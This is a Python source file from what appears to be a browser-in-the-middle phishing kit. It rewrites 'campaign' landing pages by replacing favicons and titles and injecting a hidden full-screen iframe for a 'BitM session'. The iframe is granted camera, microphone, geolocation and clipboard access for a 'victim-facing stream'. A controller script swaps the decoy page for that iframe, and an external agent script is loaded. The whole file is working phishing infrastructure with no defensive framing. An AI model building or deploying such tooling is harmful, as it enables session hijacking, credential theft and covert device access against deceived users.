from bs4 import BeautifulSoup
from pathlib import Path
import logging
import os

logger = logging.getLogger(__name__)


ENVIRONMENT = os.getenv("ENVIRONMENT", "production")

STREAM_IFRAME_PERMISSIONS = (
    "camera",
    "microphone",
    "geolocation",
    "clipboard-read",
    "clipboard-write",
)


def _delegate_stream_permissions(iframe) -> None:
    """Merge the capabilities needed by the victim-facing stream iframe."""
    existing = {
        permission.strip()
        for permission in iframe.get("allow", "").split(";")
        if permission.strip()
    }
    existing.update(STREAM_IFRAME_PERMISSIONS)
    iframe["allow"] = "; ".join(
        [*STREAM_IFRAME_PERMISSIONS]
        + sorted(existing.difference(STREAM_IFRAME_PERMISSIONS))
    )
    iframe["allowfullscreen"] = "true"

THEME_JS = """
    // Detect current mode based on system preference
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    const mainWrapper = document.querySelector('.main-wrapper');

    // Apply the detected mode
    if (prefersDark) {
        mainWrapper.classList.remove('light-mode');
        mainWrapper.classList.add('dark-mode');
    } else {
        mainWrapper.classList.remove('dark-mode');
        mainWrapper.classList.add('light-mode');
    }

    const currentMode = mainWrapper.classList.contains('dark-mode') ? 'dark' : 'light';
"""

# === Controller JavaScript ===
BITM_CONTROLLER_JS = """
(function() {
  'use strict';

  window.Controller = {
    config: {
      spinnerSelectors: ['#status-spinner', '.status-spinner'],
      successSelectors: ['#status-success', '.status-success'],
      wrapperSelectors: ['.main-wrapper', '#main-wrapper'],
      iframeSelector: '.iframe-visible'
    },

    elements: {},

    init() {
      this.elements.spinner = this.findElement(this.config.spinnerSelectors);
      this.elements.success = this.findElement(this.config.successSelectors);
      this.elements.wrapper = this.findElement(this.config.wrapperSelectors);
      this.elements.iframe = document.querySelector(this.config.iframeSelector);
    },

    findElement(selectors) {
      for (const selector of selectors) {
        const elem = document.querySelector(selector);
        if (elem) return elem;
      }
      return null;
    },

    showSpinner() {
      this.hide(this.elements.success);
      this.show(this.elements.spinner);
    },

    showSuccess() {
      this.hide(this.elements.spinner);
      this.show(this.elements.success);
    },

    showContent() {
      this.showIframe();
      this.hide(this.elements.wrapper);
    },

    showLanding() {
      this.hideIframe();
      this.show(this.elements.wrapper);
    },

    setIframeSrc(url) {
      if (this.elements.iframe) {
        this.elements.iframe.src = url;
      }
    },

    show(element) {
      if (!element) return;
      element.style.display = 'flex';
      element.style.visibility = 'visible';
      element.style.opacity = '1';
    },

    hide(element) {
      if (!element) return;
      element.style.display = 'none';
      element.style.visibility = 'hidden';
      element.style.opacity = '0';
    },

    showIframe() {
      if (!this.elements.iframe) return;
      this.elements.iframe.style.visibility = 'visible';
    },

    hideIframe() {
      if (!this.elements.iframe) return;
      this.elements.iframe.style.visibility = 'hidden';
    }
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => window.Controller.init());
  } else {
    window.Controller.init();
  }
})();
"""


def process_landing_page(html_content: str, campaign_id: str) -> str:
    """
    Process landing page HTML by injecting:
    1. Hidden iframe for BitM session
    2. Controller JavaScript (show/hide management)
    3. index.js script tag (external file)

    Args:
        html_content: Raw HTML content of landing page
        campaign_id: Campaign ID for logging/tracking

    Returns:
        Processed HTML ready to serve
    """

    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        head = soup.find('head')
        body = soup.find('body')

        if not body:
            logger.error(f"Campaign {campaign_id}: Invalid HTML - missing <body> tag")
            raise ValueError("Invalid HTML: missing <body> tag")

        # Create head if it doesn't exist
        if not head:
            head = soup.new_tag('head')
            # Insert head before body
            if body:
                body.insert_before(head)

        # === REMOVE/REPLACE HEAD ELEMENTS ===
        # Remove existing favicon, title, base href
        for tag in head.find_all('link', rel='icon'):
            tag.decompose()
        for tag in head.find_all('link', rel='shortcut icon'):
            tag.decompose()
        for tag in head.find_all('title'):
            tag.decompose()
        for tag in head.find_all('base'):
            tag.decompose()

        # === INJECT NEW HEAD ELEMENTS ===
        # Favicon
        favicon = soup.new_tag('link', rel='icon', href='FAVICON')
        head.append(favicon)

        # Title
        title = soup.new_tag('title')
        title.string = 'TITLE'
        head.append(title)

        # Base href
        if ENVIRONMENT != "production":
            base = soup.new_tag('base', href=f"/{campaign_id}/")
            head.append(base)

        logger.info(f"Campaign {campaign_id}: Head elements injected (favicon, title, base href)")

        # === VALIDATION (optional warnings) ===
        has_spinner = bool(
            soup.find(id='status-spinner') or
            soup.find(class_='status-spinner')
        )
        has_success = bool(
            soup.find(id='status-success') or
            soup.find(class_='status-success')
        )
        has_wrapper = bool(
            soup.find(class_='main-wrapper') or
            soup.find(id='main-wrapper')
        )

        if not has_spinner:
            logger.warning(f"Campaign {campaign_id}: Missing #status-spinner element")
        if not has_success:
            logger.warning(f"Campaign {campaign_id}: Missing #status-success element")
        if not has_wrapper:
            logger.warning(f"Campaign {campaign_id}: Missing .main-wrapper element")

        # === 1. INJECT IFRAME ===
        # Check if iframe already exists (avoid duplicates)
        existing_iframe = soup.find('iframe', class_='iframe-visible')

        if not existing_iframe:
            iframe = soup.new_tag('iframe', attrs={
                'class': 'iframe-visible',
                'style': (
                    'position:fixed;'
                    'top:0;'
                    'left:0;'
                    'width:100%;'
                    'height:100%;'
                    'border:none;'
                    'z-index:999999;'
                    'visibility:hidden;'
                    'opacity:0;'
                ),
                'src': '',
                'allow': '; '.join(STREAM_IFRAME_PERMISSIONS),
                'allowfullscreen': 'true'
            })

            # Insert at beginning of body
            body.insert(0, iframe)
            logger.info(f"Campaign {campaign_id}: Iframe injected")
        else:
            _delegate_stream_permissions(existing_iframe)
            logger.info(
                f"Campaign {campaign_id}: Existing iframe permissions normalized"
            )

        # === 2. INJECT BITMCONTROLLER ===
        controller_script = soup.new_tag('script', type='text/javascript')
        controller_script.string = BITM_CONTROLLER_JS
        body.append(controller_script)
        logger.info(f"Campaign {campaign_id}: Controller injected")

        # === 3. INJECT THEME JS ===
        theme_script = soup.new_tag('script', type='text/javascript')
        theme_script.string = THEME_JS
        body.append(theme_script)
        logger.info(f"Campaign {campaign_id}: Theme JS injected")

        # === 4. INJECT INDEX.JS (external script) ===
        if ENVIRONMENT == "production":
            agent_script_src = '/static/index.js'
        else:
            agent_script_src = 'static/index.js'
        agent_script = soup.new_tag('script',
                                    src=agent_script_src,
                                    type='text/javascript')
        body.append(agent_script)
        logger.info(f"Campaign {campaign_id}: Index.js script tag injected")

        processed_html = str(soup)
        logger.info(
            f"Campaign {campaign_id}: Landing page processed successfully "
            f"({len(processed_html)} bytes)"
        )

        return processed_html

    except Exception as e:
        logger.error(f"Campaign {campaign_id}: Failed to process landing page - {e}")
        raise


def validate_landing_page(html_content: str) -> dict:
    """
    Validate landing page has required elements

    Returns:
        dict with validation results
    """
    soup = BeautifulSoup(html_content, 'html.parser')

    results = {
        'valid': True,
        'errors': [],
        'warnings': [],
        'has_body': bool(soup.find('body')),
        'has_spinner': bool(
            soup.find(id='status-spinner') or
            soup.find(class_='status-spinner')
        ),
        'has_success': bool(
            soup.find(id='status-success') or
            soup.find(class_='status-success')
        ),
        'has_wrapper': bool(
            soup.find(class_='main-wrapper') or
            soup.find(id='main-wrapper')
        )
    }

    # Check for errors
    if not results['has_body']:
        results['valid'] = False
        results['errors'].append("Missing <body> tag")

    # Check for warnings
    if not results['has_spinner']:
        results['warnings'].append("Missing #status-spinner element (optional)")
    if not results['has_success']:
        results['warnings'].append("Missing #status-success element (optional)")
    if not results['has_wrapper']:
        results['warnings'].append("Missing .main-wrapper element (recommended)")

    return results
